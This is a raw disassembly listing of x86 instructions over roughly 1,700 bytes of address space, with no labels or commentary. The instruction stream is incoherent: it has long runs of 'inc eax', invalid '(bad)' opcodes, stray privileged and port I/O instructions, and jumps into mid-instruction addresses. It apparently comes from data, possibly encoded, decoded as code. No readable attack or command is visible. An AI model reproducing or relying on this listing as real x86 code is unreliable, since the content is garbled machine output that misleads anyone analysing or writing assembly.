  416b89:	xor    DWORD PTR [ebx+ecx*2],0xffffff8f
  416b8d:	dec    ebp
  416b8e:	sub    DWORD PTR [edi+0x2c200edc],esp
  416b94:	hlt    
  416b95:	adc    eax,DWORD PTR [edx-0x2a]
  416b98:	inc    eax
  416b99:	inc    eax
  416b9a:	inc    eax
  416b9b:	inc    eax
  416b9c:	inc    eax
  416b9d:	inc    eax
  416b9e:	inc    eax
  416b9f:	inc    eax
  416ba0:	inc    eax
  416ba1:	inc    eax
  416ba2:	fidivr WORD PTR [ecx+0x68]
  416ba5:	scas   al,BYTE PTR es:[di]
  416ba7:	dec    edi
  416ba8:	loope  0x416bf2
  416baa:	arpl   WORD PTR [ebx+0x3c],sp
  416bad:	test   al,0x57
  416baf:	jae    0x416bf5
  416bb1:	push   esi
  416bb2:	inc    eax
  416bb3:	inc    eax
  416bb4:	inc    eax
  416bb5:	inc    eax
  416bb6:	inc    eax
  416bb7:	inc    eax
  416bb8:	int3   
  416bb9:	jne    0x416bfb
  416bbb:	loopne 0x416c30
  416bbd:	bound  edx,QWORD PTR [eax]
  416bbf:	inc    ecx
  416bc0:	loope  0x416c24
  416bc2:	pop    esp
  416bc3:	adc    eax,0x43b87ec8
  416bc8:	sar    DWORD PTR [ebx],1
  416bca:	dec    esi
  416bcb:	int    0x63
  416bcd:	stos   DWORD PTR es:[edi],eax
  416bce:	inc    ecx
  416bcf:	xor    BYTE PTR [edx+0x21],ch
  416bd2:	inc    eax
  416bd3:	add    cl,al
  416bd5:	inc    eax
  416bd6:	inc    eax
  416bd7:	inc    eax
  416bd8:	inc    eax
  416bd9:	add    BYTE PTR [eax-0x6c],al
  416bdc:	adc    DWORD PTR [ebp-0x6f],edi
  416bdf:	push   cs
  416be0:	int3   
  416be1:	mov    ch,0x36
  416be3:	mov    ds:0x909e0864,al
  416be8:	inc    eax
  416be9:	inc    eax
  416bea:	inc    eax
  416beb:	inc    eax
  416bec:	inc    eax
  416bed:	inc    eax
  416bee:	inc    eax
  416bef:	inc    eax
  416bf0:	inc    DWORD PTR [eax+0x40]
  416bf3:	jo     0x416c22
  416bf5:	add    cl,BYTE PTR [eax]
  416bf7:	shl    DWORD PTR [eax+0x2d373112],1
  416bfd:	dec    ebx
  416bfe:	inc    ebx
  416bff:	inc    eax
  416c00:	inc    eax
  416c01:	inc    eax
  416c02:	inc    eax
  416c03:	inc    eax
  416c04:	inc    eax
  416c05:	inc    eax
  416c06:	inc    eax
  416c07:	inc    eax
  416c08:	inc    eax
  416c09:	bound  eax,QWORD PTR [ecx-0x1c]
  416c0c:	ins    BYTE PTR es:[edi],dx
  416c0d:	mov    edi,0x10e613fb
  416c12:	mov    ecx,0x3142f50e
  416c17:	(bad)
  416c1a:	sbb    al,0xf2
  416c1c:	test   al,0xd3
  416c1e:	mov    ds:0xa865628a,eax
  416c23:	add    al,0x12
  416c25:	inc    ebx
  416c26:	sub    DWORD PTR [ebx+0x40406512],esp
  416c2c:	inc    eax
  416c2d:	inc    eax
  416c2e:	inc    eax
  416c2f:	inc    eax
  416c30:	inc    eax
  416c31:	inc    eax
  416c32:	add    bh,dl
  416c34:	shl    BYTE PTR [esi+0x71],1
  416c37:	push   0x222a60a7
  416c3c:	push   cs
  416c3d:	test   DWORD PTR [eax+0x3a],0x846041c5
  416c44:	lock bound edx,QWORD PTR [edx]
  416c47:	ret    0x2db
  416c4a:	jp     0x416bf8
  416c4c:	clc    
  416c4d:	push   es
  416c4e:	or     DWORD PTR [ecx+0x62626b40],esp
  416c54:	add    eax,0x40274416
  416c59:	inc    eax
  416c5a:	inc    eax
  416c5b:	inc    eax
  416c5c:	inc    eax
  416c5d:	inc    eax
  416c5e:	and    eax,0x60404040
  416c63:	aas    
  416c64:	adc    BYTE PTR [edx-0x79],dh
  416c67:	shl    BYTE PTR ds:[ecx+0x77],1
  416c6b:	and    al,0xb0
  416c6d:	push   esp
  416c6e:	inc    eax
  416c6f:	inc    ebx
  416c70:	(bad)  
  416c72:	inc    eax
  416c73:	fild   WORD PTR ds:0x42334163
  416c79:	and    BYTE PTR [eax-0x5c],al
  416c7c:	int    0x6b
  416c7e:	js     0x416c48
  416c80:	shl    BYTE PTR [ecx+0x40404040],1
  416c86:	inc    eax
  416c87:	inc    eax
  416c88:	inc    eax
  416c89:	inc    eax
  416c8a:	inc    eax
  416c8b:	inc    eax
  416c8c:	sub    al,0x62
  416c8e:	inc    ecx
  416c8f:	sbb    DWORD PTR [eax+eax*2],esp
  416c92:	inc    edx
  416c93:	and    ch,BYTE PTR [ebx]
  416c95:	sub    eax,0x310f7d04
  416c9a:	fild   WORD PTR [eax+0x40]
  416c9d:	inc    eax
  416c9e:	inc    eax
  416c9f:	inc    eax
  416ca0:	inc    eax
  416ca1:	rol    DWORD PTR [eax+0x40],0x60
  416ca5:	and    al,0xe0
  416ca7:	xor    BYTE PTR [edx-0x74],ah
  416caa:	ins    BYTE PTR es:[edi],dx
  416cab:	stos   DWORD PTR es:[edi],eax
  416cac:	daa    
  416cad:	inc    eax
  416cae:	bound  esp,QWORD PTR [ebp-0x35]
  416cb1:	dec    ecx
  416cb2:	xchg   edx,eax
  416cb3:	jae    0x416ce5
  416cb5:	sub    al,0xcb
  416cb7:	cmp    esp,DWORD PTR [edi-0x28]
  416cba:	dec    ebp
  416cbb:	inc    edx
  416cbc:	and    DWORD PTR [ebx+0x40],eax
  416cbf:	inc    eax
  416cc0:	add    BYTE PTR [eax+0x40],al
  416cc3:	inc    eax
  416cc4:	inc    eax
  416cc5:	inc    eax
  416cc6:	inc    eax
  416cc7:	mov    esp,0xf56c3554
  416ccc:	aam    0xc3
  416cce:	cwde   
  416ccf:	mul    DWORD PTR [esp+eax*1+0x4f]
  416cd3:	pop    eax
  416cd4:	add    ah,BYTE PTR [ebx+0x5a]
  416cd7:	xor    al,BYTE PTR [edi+0x401ef45f]
  416cdd:	pop    ds
  416cde:	inc    eax
  416cdf:	bound  eax,QWORD PTR [eax+0x40]
  416ce2:	inc    eax
  416ce3:	inc    eax
  416ce4:	inc    eax
  416ce5:	inc    eax
  416ce6:	inc    eax
  416ce7:	inc    eax
  416ce8:	inc    eax
  416ce9:	inc    eax
  416cea:	daa    
  416ceb:	arpl   sp,sp
  416ced:	jp     0x416c7f
  416cef:	mov    eax,ds:0x47c93540
  416cf4:	add    eax,0x414a1743
  416cf9:	call   0x33c94962
  416cfe:	inc    eax
  416cff:	and    al,dl
  416d01:	adc    eax,0x40404087
  416d06:	inc    eax
  416d07:	inc    eax
  416d08:	inc    eax
  416d09:	int3   
  416d0a:	jne    0x416d4c
  416d0c:	push   edx
  416d0d:	rol    ah,0x72
  416d10:	adc    eax,DWORD PTR [eax+0x50]
  416d13:	pop    eax
  416d14:	arpl   bx,sp
  416d16:	rol    DWORD PTR [eax-0x62],0x40
  416d1a:	adc    eax,0x4462909d
  416d1f:	mov    al,0xc2
  416d21:	inc    ebx
  416d22:	push   ds
  416d23:	inc    eax
  416d24:	add    cl,al
  416d26:	inc    eax
  416d27:	inc    eax
  416d28:	inc    eax
  416d29:	inc    eax
  416d2a:	add    BYTE PTR [eax+0x6c],al
  416d2d:	pop    edx
  416d2e:	lds    ebx,FWORD PTR [edx+0x11]
  416d31:	xor    DWORD PTR [edx+eiz*2-0x78],eax
  416d35:	enter  0x6a4f,0xf
  416d39:	retf   0x12f4
  416d3c:	mov    dh,0x4c
  416d3e:	ins    DWORD PTR es:[edi],dx
  416d3f:	inc    eax
  416d40:	inc    eax
  416d41:	inc    eax
  416d42:	inc    eax
  416d43:	inc    eax
  416d44:	inc    eax
  416d45:	inc    eax
  416d46:	inc    eax
  416d47:	inc    DWORD PTR [eax-0x4f]
  416d4a:	inc    eax
  416d4b:	mov    ecx,0x3d38005a
  416d50:	shr    BYTE PTR [edi+0x5240c114],cl
  416d56:	test   eax,0x42435545
  416d5b:	sub    DWORD PTR [eax+0xd],eax
  416d5e:	pushf  
  416d5f:	test   al,0xb8
  416d61:	shl    BYTE PTR [eax-0x3f],cl
  416d64:	inc    eax
  416d65:	jnp    0x416d6c
  416d67:	xor    BYTE PTR [edi+0x12],ah
  416d6a:	inc    edx
  416d6b:	aas    
  416d6c:	inc    eax
  416d6d:	inc    eax
  416d6e:	inc    eax
  416d6f:	inc    eax
  416d70:	inc    eax
  416d71:	inc    eax
  416d72:	inc    eax
  416d73:	inc    eax
  416d74:	inc    eax
  416d75:	inc    eax
  416d76:	aas    
  416d77:	bswap  ebx
  416d79:	dec    edx
  416d7a:	inc    esi
  416d7b:	xchg   edx,eax
  416d7c:	jg     0x416dc0
  416d7e:	inc    ecx
  416d7f:	mov    esi,0x5a286248
  416d84:	jb     0x416d68
  416d86:	ja     0x416dc8
  416d88:	inc    eax
  416d89:	inc    eax
  416d8a:	inc    eax
  416d8b:	inc    eax
  416d8c:	inc    eax
  416d8d:	inc    eax
  416d8e:	inc    eax
  416d8f:	add    BYTE PTR [ebp+0x42],ah
  416d92:	inc    eax
  416d93:	ret    
  416d94:	popa   
  416d95:	inc    edx
  416d96:	and    eax,0x5f79580c
  416d9b:	test   al,0x41
  416d9d:	jno    0x416de2
  416d9f:	arpl   WORD PTR [ebx],di
  416da1:	cld    
  416da2:	mov    edi,0x60413610
  416da7:	inc    eax
  416da8:	xor    DWORD PTR [edx-0x41],ebp
  416dab:	mov    ah,0x40
  416dad:	inc    eax
  416dae:	inc    eax
  416daf:	inc    eax
  416db0:	inc    eax
  416db1:	inc    eax
  416db2:	and    eax,0x34404040
  416db7:	sar    BYTE PTR [ecx],1
  416db9:	inc    eax
  416dba:	arpl   WORD PTR [ebx+0x28],dx
  416dbd:	inc    ecx
  416dbe:	rcr    BYTE PTR [ebx-0x46],0x2e
  416dc2:	sub    ah,bl
  416dc4:	inc    eax
  416dc5:	push   cs
  416dc6:	ror    DWORD PTR [esi],0x1e
  416dc9:	inc    eax
  416dca:	test   al,0x27
  416dcc:	sub    dl,al
  416dce:	inc    eax
  416dcf:	inc    eax
  416dd0:	and    DWORD PTR [eax+0x10],eax
  416dd3:	mov    WORD PTR [edx],ss
  416dd5:	inc    eax
  416dd6:	inc    eax
  416dd7:	inc    eax
  416dd8:	inc    eax
  416dd9:	inc    eax
  416dda:	inc    eax
  416ddb:	inc    eax
  416ddc:	inc    eax
  416ddd:	inc    eax
  416dde:	inc    eax
  416ddf:	inc    edx
  416de0:	or     DWORD PTR es:[ebp+0x40],edx
  416de4:	mov    esp,0x6b284868
  416de9:	jle    0x416e4c
  416deb:	add    al,0x41
  416ded:	imul   eax,DWORD PTR [esi+0x12],0x4045f04c
  416df4:	and    ch,bl
  416df6:	mov    al,0x40
  416df8:	inc    eax
  416df9:	inc    eax
  416dfa:	inc    eax
  416dfb:	inc    eax
  416dfc:	inc    eax
  416dfd:	rol    DWORD PTR [eax+0x40],0xfc
  416e01:	inc    ebx
  416e02:	or     eax,0x40344020
  416e07:	or     BYTE PTR ds:0x403440c5,dl
  416e0d:	gs mov ah,0x66
  416e10:	int    0x2b
  416e12:	pop    ds
  416e13:	push   edx
  416e14:	inc    eax
  416e15:	push   esp
  416e16:	push   edx
  416e17:	fist   DWORD PTR [ecx]
  416e19:	xor    al,0x40
  416e1b:	bound  eax,QWORD PTR [eax+0x40]
  416e1e:	add    BYTE PTR [eax+0x40],al
  416e21:	inc    eax
  416e22:	inc    eax
  416e23:	inc    eax
  416e24:	inc    eax
  416e25:	xlat   BYTE PTR ds:[ebx]
  416e26:	or     ah,bh
  416e28:	shl    BYTE PTR [ebx+eax*4-0x345dcc30],1
  416e2f:	les    edx,FWORD PTR [edx+0x45]
  416e32:	gs push ecx
  416e34:	sub    al,0xe7
  416e36:	push   eax
  416e37:	les    eax,FWORD PTR [eax-0x11]
  416e3a:	inc    eax
  416e3b:	inc    eax
  416e3c:	inc    eax
  416e3d:	inc    eax
  416e3e:	inc    eax
  416e3f:	inc    eax
  416e40:	inc    eax
  416e41:	inc    eax
  416e42:	inc    eax
  416e43:	inc    eax
  416e44:	sub    BYTE PTR [ebx],al
  416e46:	and    esi,DWORD PTR ds:0x384a6341
  416e4c:	cmp    al,0x15
  416e4e:	es sub eax,0x50915dc4
  416e54:	inc    ebx
  416e55:	shl    cl,1
  416e57:	mov    ss,WORD PTR [eax+eax*4+0x40404073]
  416e5e:	inc    eax
  416e5f:	inc    eax
  416e60:	inc    eax
  416e61:	int3   
  416e62:	jne    0x416ea4
  416e64:	rol    BYTE PTR [eax+0x16],0xab
  416e68:	and    DWORD PTR [edx-0x28],0x2924420c
  416e6f:	dec    edx
  416e70:	ja     0x416e83
  416e72:	fsub   DWORD PTR [ebx+0x2a]
  416e75:	ins    BYTE PTR es:[edi],dx
  416e76:	lock add al,0x52
  416e79:	outs   dx,BYTE PTR ds:[esi]
  416e7a:	ss dec ebp
  416e7c:	inc    ebp
  416e7d:	add    ax,0xd47c
  416e81:	and    DWORD PTR [edx-0x14],esi
  416e84:	sub    al,BYTE PTR [eax+0x0]
  416e87:	rol    DWORD PTR [eax+0x40],0x40
  416e8b:	inc    eax
  416e8c:	add    BYTE PTR [eax+0x43],al
  416e8f:	imul   esi,DWORD PTR [ebx+0x64],0x6c6362
  416e96:	lds    edx,FWORD PTR [eax-0x71]
  416e99:	sub    ch,BYTE PTR [edi+0x4c]
  416e9c:	imul   ebp,DWORD PTR [edx],0x11
  416e9f:	gs inc ebp
  416ea1:	xchg   esi,eax
  416ea2:	pop    eax
  416ea3:	stos   DWORD PTR es:[edi],eax
  416ea4:	clc    
  416ea5:	inc    ebx
  416ea6:	fisttp DWORD PTR [ecx-0x72]
  416ea9:	fld    DWORD PTR [eax+0x40]
  416eac:	inc    eax
  416ead:	inc    eax
  416eae:	inc    eax
  416eaf:	inc    eax
  416eb0:	inc    eax
  416eb1:	inc    eax
  416eb2:	inc    DWORD PTR [eax+0x53]
  416eb5:	sub    ecx,DWORD PTR [si-0x53]
  416eb9:	nop
  416eba:	outs   dx,DWORD PTR ss:[esi]
  416ebc:	mov    ah,0x36
  416ebe:	test   BYTE PTR [ebx+ebp*2],dh
  416ec1:	adc    eax,0xbc15c3d7
  416ec6:	push   edx
  416ec7:	or     ebp,DWORD PTR [eax]
  416ec9:	jno    0x416e4c
  416ecb:	sub    ecx,ebp
  416ecd:	jb     0x416f3a
  416ecf:	or     BYTE PTR [eax],bh
  416ed1:	push   esp
  416ed2:	inc    esp
  416ed3:	aas    
  416ed4:	lods   al,BYTE PTR ds:[esi]
  416ed5:	rcl    DWORD PTR [eax+eax*2+0x40404040],0x40
  416edd:	inc    eax
  416ede:	inc    eax
  416edf:	inc    eax
  416ee0:	inc    eax
  416ee1:	arpl   WORD PTR [ebx-0x2e],ax
  416ee4:	sub    DWORD PTR [ecx+0x41],0x400e6262
  416eeb:	jp     0x416f5b
  416eed:	push   0xf02bb802
  416ef2:	inc    eax
  416ef3:	inc    eax
  416ef4:	inc    eax
  416ef5:	inc    eax
  416ef6:	inc    eax
  416ef7:	inc    eax
  416ef8:	inc    eax
  416ef9:	inc    eax
  416efa:	add    BYTE PTR [edx+ecx*2],ah
  416efd:	cdq    
  416efe:	outs   dx,DWORD PTR ds:[esi]
  416eff:	dec    eax
  416f00:	ja     0x416ef6
  416f02:	dec    ecx
  416f03:	ins    BYTE PTR es:[edi],dx
  416f04:	fincstp 
  416f06:	loope  0x416f5b
  416f08:	mov    ecx,0x4a002094
  416f0d:	push   ecx
  416f0e:	fxch   st(1)
  416f10:	arpl   sp,di
  416f12:	test   BYTE PTR [ebx-0x21],0xd
  416f16:	inc    eax
  416f17:	inc    eax
  416f18:	inc    eax
  416f19:	inc    eax
  416f1a:	inc    eax
  416f1b:	inc    eax
  416f1c:	and    eax,0xc1404040
  416f21:	cmp    BYTE PTR [ecx-0x17],dl
  416f24:	test   al,0xc5
  416f26:	shr    BYTE PTR [esi-0x79],1
  416f29:	fs xor eax,0x53431254
  416f2f:	mov    ch,0x8a
  416f31:	pop    eax
  416f32:	sub    BYTE PTR [ecx+0x5f44a5a4],0x26
  416f39:	rol    ch,1
  416f3b:	outs   dx,DWORD PTR ds:[esi]
  416f3c:	inc    ecx
  416f3d:	inc    eax
  416f3e:	inc    eax
  416f3f:	inc    eax
  416f40:	inc    eax
  416f41:	inc    eax
  416f42:	inc    eax
  416f43:	inc    eax
  416f44:	inc    eax
  416f45:	inc    eax
  416f46:	inc    eax
  416f47:	sub    DWORD PTR [ebx-0x6e939b7f],edx
  416f4d:	and    DWORD PTR [esi],ecx
  416f4f:	mov    ch,0x15
  416f51:	inc    ecx
  416f52:	scas   al,BYTE PTR es:[edi]
  416f53:	test   al,0x42
  416f55:	data16 lock sub ch,dl
  416f59:	inc    eax
  416f5a:	inc    eax
  416f5b:	inc    eax
  416f5c:	inc    eax
  416f5d:	inc    eax
  416f5e:	inc    eax
  416f5f:	rol    DWORD PTR [eax+0x40],0x2
  416f63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f64:	nop
  416f65:	(bad)  
  416f66:	or     dh,BYTE PTR ds:[edi+ebx*1]
  416f6a:	or     edx,edi
  416f6c:	aad    0x24
  416f6e:	fmul   DWORD PTR [eax-0x53f6bebd]
  416f74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f75:	sub    BYTE PTR [eax+0x40],al
  416f78:	add    BYTE PTR [eax+0x40],al
  416f7b:	inc    eax
  416f7c:	inc    eax
  416f7d:	inc    eax
  416f7e:	inc    eax
  416f7f:	inc    eax
  416f80:	gs inc eax
  416f82:	jno    0x416f04
  416f84:	sub    eax,0xd40c80d
  416f89:	and    al,0x1
  416f8b:	nop    DWORD PTR [ebp-0x35]
  416f8f:	inc    eax
  416f90:	xchg   esp,eax
  416f91:	ins    BYTE PTR es:[edi],dx
  416f92:	aaa    
  416f93:	outs   dx,BYTE PTR ds:[esi]
  416f94:	fs repnz mov edi,0x4e1a84c4
  416f9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f9c:	pop    es
  416f9d:	inc    eax
  416f9e:	inc    eax
  416f9f:	inc    eax
  416fa0:	inc    eax
  416fa1:	inc    eax
  416fa2:	inc    eax
  416fa3:	inc    eax
  416fa4:	inc    eax
  416fa5:	inc    eax
  416fa6:	inc    eax
  416fa7:	stc    
  416fa8:	mov    edi,0x52430d41
  416fad:	mov    ch,0xa3
  416faf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fb0:	imul   esi,DWORD PTR [edx],0xffffffc9
  416fb3:	lds    edi,FWORD PTR [edx]
  416fb5:	jae    0x416f8e
  416fb7:	jl     0x416f57
  416fb9:	and    BYTE PTR [eax+eiz*8-0x551e919e],bl
  416fc0:	test   al,0x33
  416fc2:	inc    ecx
  416fc3:	out    0xd1,eax
  416fc5:	mov    ebx,0x4040400a
  416fca:	inc    eax
  416fcb:	inc    eax
  416fcc:	inc    eax
  416fcd:	int3   
  416fce:	jne    0x417010
  416fd0:	mov    ds:0x2a0e2d40,al
  416fd5:	inc    ecx
  416fd6:	push   ecx
  416fd7:	das    
  416fd8:	adc    eax,0x8bf0a82a
  416fdd:	mov    bl,0xd
  416fdf:	xchg   ebx,eax
  416fe0:	popa   
  416fe1:	inc    edi
  416fe2:	adc    DWORD PTR [eax+0x0],eax
  416fe5:	rol    DWORD PTR [eax+0x40],0x40
  416fe9:	inc    eax
  416fea:	add    BYTE PTR [eax-0x78],al
  416fed:	sub    BYTE PTR ds:0x3e546d,bl
  416ff3:	inc    ecx
  416ff4:	add    eax,0x2e365330
  416ff9:	push   esp
  416ffa:	inc    eax
  416ffb:	inc    eax
  416ffc:	inc    eax
  416ffd:	inc    eax
  416ffe:	inc    eax
  416fff:	inc    eax
  417000:	inc    eax
  417001:	inc    eax
  417002:	inc    DWORD PTR [eax-0x18]
  417005:	xor    DWORD PTR [edi+0x3021f43],eax
  41700b:	cli    
  41700c:	bound  edi,QWORD PTR [eax]
  41700e:	inc    eax
  41700f:	inc    eax
  417010:	push   edx
  417011:	inc    ebx
  417012:	out    0xa0,eax
  417014:	jg     0x417068
  417016:	inc    ecx
  417017:	and    al,0xaf
  417019:	add    BYTE PTR [esi+eax*1-0x64],cl
  41701d:	inc    eax
  41701e:	inc    eax
  41701f:	inc    eax
  417020:	inc    eax
  417021:	inc    eax
  417022:	inc    eax
  417023:	inc    eax
  417024:	inc    eax
  417025:	inc    eax
  417026:	inc    eax
  417027:	aam    0x20
  417029:	ins    BYTE PTR es:[edi],dx
  41702a:	and    edx,DWORD PTR [edi]
  41702c:	sub    al,0xa2
  41702e:	bound  ebx,QWORD PTR [eax+edi*1]
  417031:	xor    al,0x54
  417033:	inc    eax
  417034:	icebp  
  417035:	inc    eax
  417036:	inc    eax
  417037:	inc    eax
  417038:	inc    eax
  417039:	inc    eax
  41703a:	inc    eax
  41703b:	inc    eax
  41703c:	inc    eax
  41703d:	add    BYTE PTR [esi+0x437e52b6],bl
  417043:	jae    0x417079
  417045:	test   DWORD PTR [ecx],ecx
  417047:	or     eax,0xc3c5f8cb
  41704c:	jb     0x41709a
  41704e:	lods   eax,DWORD PTR ds:[esi]
  41704f:	inc    ecx
  417050:	sar    ah,1
  417052:	push   0xffffffb5
  417054:	inc    ebx
  417055:	bound  ebx,QWORD PTR [eax+eax*2+0x40404040]
  41705c:	inc    eax
  41705d:	and    eax,0xc2404040
  417062:	fisttp WORD PTR [ebx-0x50]
  417065:	inc    edi
  417066:	and    BYTE PTR [ebp+edx*1+0xd1a846],0x71
  41706e:	prefetch BYTE PTR [edi-0x7]
  417072:	retf   0xdacf
  417075:	inc    ebx
  417076:	inc    eax
  417077:	(bad)  
  417078:	out    0xb4,al
  41707a:	xor    BYTE PTR [ecx+0x28],cl
  41707d:	xchg   ecx,eax
  41707e:	adc    al,0x40
  417080:	pop    esi
  417081:	arpl   WORD PTR [edi+0x6b5e2c91],sp
  417087:	inc    eax
  417088:	inc    eax
  417089:	inc    eax
  41708a:	inc    eax
  41708b:	inc    eax
  41708c:	inc    eax
  41708d:	inc    eax
  41708e:	inc    eax
  41708f:	inc    eax
  417090:	inc    eax
  417091:	std    
  417092:	pop    esp
  417093:	cmp    edi,DWORD PTR [eax]
  417095:	imul   eax,DWORD PTR [ebx+0x39],0xffffffa4
  417099:	inc    edx
  41709a:	push   esp
  41709b:	arpl   WORD PTR [ebx+0x1d],di
  41709e:	inc    eax
  41709f:	jno    0x417113
  4170a1:	out    0x5a,al
  4170a3:	inc    ecx
  4170a4:	xor    esi,DWORD PTR [eax]
  4170a6:	and    al,0x14
  4170a8:	imul   ebx,edi,0x24
  4170ab:	inc    esp
  4170ac:	inc    eax
  4170ad:	inc    eax
  4170ae:	inc    eax
  4170af:	inc    eax
  4170b0:	inc    eax
  4170b1:	inc    eax
  4170b2:	rol    DWORD PTR [eax+0x40],0x46
  4170b6:	imul   DWORD PTR [ebp+esi*1-0x69]
  4170ba:	xor    edx,0xfffffff8
  4170bd:	mov    di,0x3ece
  4170c1:	add    eax,0x130ad075
  4170c6:	push   cs
  4170c7:	inc    ebx
  4170c8:	inc    esi
  4170c9:	fiadd  WORD PTR gs:[eax+0x40]
  4170cd:	add    BYTE PTR [eax+0x40],al
  4170d0:	inc    eax
  4170d1:	inc    eax
  4170d2:	inc    eax
  4170d3:	inc    eax
  4170d4:	pop    ecx
  4170d5:	xor    al,0x63
  4170d7:	repnz lds esi,FWORD PTR [ecx]
  4170da:	xchg   ecx,eax
  4170db:	bound  ebx,QWORD PTR [eax+0x619c3542]
  4170e1:	pop    ebp
  4170e2:	pusha  
  4170e3:	mov    ebx,0x504008d
  4170e8:	push   ds
  4170e9:	xor    al,0x1
  4170eb:	pop    ds
  4170ec:	xor    ah,bh
  4170ee:	push   edx
  4170ef:	int    0x9d
  4170f1:	add    al,0x41
  4170f3:	aas    
  4170f4:	bound  eax,QWORD PTR [eax+0x40]
  4170f7:	inc    eax
  4170f8:	inc    eax
  4170f9:	inc    eax
  4170fa:	inc    eax
  4170fb:	inc    eax
  4170fc:	inc    eax
  4170fd:	inc    eax
  4170fe:	inc    eax
  4170ff:	mov    DWORD PTR gs:[edx-0x45],esp
  417103:	inc    ecx
  417104:	or     cl,0x44
  417107:	mov    edi,0x102833a8
  41710c:	jle    0x4170ba
  41710e:	lods   al,BYTE PTR ds:[esi]
  41710f:	mov    edi,0x6e28601a
  417114:	dec    edx
  417115:	fdiv   st,st(2)
  417117:	fcmovu st,st(6)
  417119:	inc    eax
  41711a:	inc    eax
  41711b:	inc    eax
  41711c:	inc    eax
  41711d:	inc    eax
  41711e:	inc    eax
  41711f:	int3   
  417120:	jne    0x417162
  417122:	loopne 0x417167
  417124:	popa   
  417125:	add    bl,ch
  417127:	int3   
  417128:	clc    
  417129:	ins    BYTE PTR es:[edi],dx
  41712a:	fs inc eax
  41712c:	rep outs dx,DWORD PTR ds:[esi]
  41712e:	jle    0x4170eb
  417130:	test   al,0x34
  417132:	push   ebx
  417133:	and    al,0x40
  417135:	add    cl,al
  417137:	inc    eax
  417138:	inc    eax
  417139:	inc    eax
  41713a:	inc    eax
  41713b:	add    BYTE PTR [eax+0x5c],al
  41713e:	inc    eax
  41713f:	push   esi
  417140:	jo     0x417184
  417142:	arpl   WORD PTR [ebp+0x6c],bp
  417145:	push   ebx
  417146:	jl     0x41711f
  417148:	fs jns 0x41711b
  41714b:	sub    eax,0x44d6a84d
  417151:	mov    al,0xa9
  417153:	arpl   WORD PTR [ebx-0x2b],ax
  417156:	dec    edi
  417157:	sbb    eax,0x26b8642c
  41715c:	lds    edx,FWORD PTR [edi+0x4032e399]
  417162:	inc    eax
  417163:	inc    eax
  417164:	inc    eax
  417165:	inc    eax
  417166:	inc    eax
  417167:	inc    eax
  417168:	inc    eax
  417169:	inc    DWORD PTR [eax+0x68]
  41716c:	into   
  41716d:	fsub   QWORD PTR [esi+0x2d]
  417170:	cs xchg ebp,eax
  417172:	lds    ebp,FWORD PTR [edi+ecx*8-0x7dec46c0]
  417179:	dec    esi
  41717a:	push   esi
  41717b:	bound  ecx,QWORD PTR [eax+0x2a]
  41717e:	inc    eax
  41717f:	inc    eax
  417180:	inc    eax
  417181:	inc    eax
  417182:	inc    eax
  417183:	inc    eax
  417184:	inc    eax
  417185:	inc    eax
  417186:	inc    eax
  417187:	inc    eax
  417188:	or     al,BYTE PTR [ebx+0x2b]
  41718b:	(bad)  
  41718c:	into   
  41718d:	ins    BYTE PTR es:[edi],dx
  41718e:	inc    ebp
  41718f:	lds    ecx,FWORD PTR [ebx-0x70]
  417192:	inc    eax
  417193:	jnp    0x4171a3
  417195:	push   ebp
  417196:	sbb    DWORD PTR [esi+0x28],eax
  417199:	and    DWORD PTR [esi],ebp
  41719b:	inc    eax
  41719c:	inc    eax
  41719d:	inc    eax
  41719e:	inc    eax
  41719f:	inc    eax
  4171a0:	inc    eax
  4171a1:	inc    eax
  4171a2:	inc    eax
  4171a3:	add    BYTE PTR [edi+0x66],al
  4171a6:	test   al,0x67
  4171a8:	bound  esp,QWORD PTR [eax+ebx*1]
  4171ab:	sbb    ebp,DWORD PTR [esi+0x31]
  4171ae:	(bad)  
  4171af:	ins    BYTE PTR es:[edi],dx
  4171b0:	imul   eax,DWORD PTR [ebx-0x6d],0x40404081
  4171b7:	inc    eax
  4171b8:	inc    eax
  4171b9:	inc    eax
  4171ba:	and    eax,0x7b404040
  4171bf:	xor    BYTE PTR [ebx],dl
  4171c1:	ja     0x41719f
  4171c3:	inc    eax
  4171c4:	pop    ebx
  4171c5:	push   edx
  4171c6:	stos   BYTE PTR es:[edi],al
  4171c7:	inc    esp
  4171c8:	(bad)  
  4171c9:	fstp   QWORD PTR [ecx+0x32803724]
  4171cf:	lods   eax,DWORD PTR ds:[esi]
  4171d0:	push   0x636c3f10
  4171d5:	pop    ds
  4171d6:	inc    eax
  4171d7:	inc    eax
  4171d8:	inc    eax
  4171d9:	inc    eax
  4171da:	inc    eax
  4171db:	inc    eax
  4171dc:	inc    eax
  4171dd:	inc    eax
  4171de:	inc    eax
  4171df:	inc    eax
  4171e0:	mov    edx,DWORD PTR [edi-0x7d362f54]
  4171e6:	fld    DWORD PTR [esi+0x68624472]
  4171ec:	bound  eax,QWORD PTR [ebx+0x25]
  4171ef:	dec    ebx
  4171f0:	push   es
  4171f1:	bound  esi,QWORD PTR [eax]
  4171f3:	sbb    al,0x34
  4171f5:	(bad)
  4171f8:	test   al,0x40
  4171fa:	inc    eax
  4171fb:	inc    eax
  4171fc:	inc    eax
  4171fd:	inc    eax
  4171fe:	inc    eax
  4171ff:	rol    DWORD PTR [eax+0x40],0xcd
  417203:	stos   DWORD PTR es:[edi],eax
  417204:	adc    BYTE PTR [eax+0x5a34412a],al
  41720a:	pop    esi
  41720b:	mov    esp,0x40f0c562
  417210:	inc    eax
  417211:	add    BYTE PTR [eax+0x40],al
  417214:	inc    eax
  417215:	inc    eax
  417216:	inc    eax
  417217:	inc    eax
  417218:	mov    cl,0x62
  41721a:	test   eax,0x41350595
  41721f:	mov    BYTE PTR [edi-0x344017fe],bl
  417225:	and    BYTE PTR [ebx+0x40],0x40
  417229:	inc    eax
  41722a:	inc    eax
  41722b:	inc    eax
  41722c:	inc    eax
  41722d:	inc    eax
  41722e:	inc    eax
  41722f:	inc    eax
  417230:	inc    eax
  417231:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417232:	push   ecx
  417233:	xor    ah,BYTE PTR [esi-0x23acba41]
  417239:	sub    BYTE PTR [ecx],bl
  41723b:	or     BYTE PTR [ebx],bh
  41723d:	mov    edi,0x2041aa43
  417242:	pusha  
  417243:	add    DWORD PTR [ebp-0x56cb9cd4],0x5e559443
  41724d:	inc    ecx
  41724e:	inc    eax
  41724f:	inc    eax
  417250:	inc    eax
